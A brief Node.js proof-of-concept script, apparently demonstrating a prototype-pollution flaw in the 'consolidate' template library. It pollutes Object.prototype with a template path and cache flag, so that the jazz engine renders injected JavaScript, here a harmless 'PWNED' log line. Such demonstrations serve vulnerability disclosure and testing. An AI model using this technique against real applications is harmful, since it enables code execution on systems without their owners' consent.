var cons = require('consolidate');

Object.prototype['views/page.html'] = 'console.log("PWNED")';
Object.prototype.cache = true;

cons.jazz('views/page.html', { user: 'tobi' })
  .then(function (html) {
    console.log(html);
  })
  .catch(function (err) {
    throw err;
  });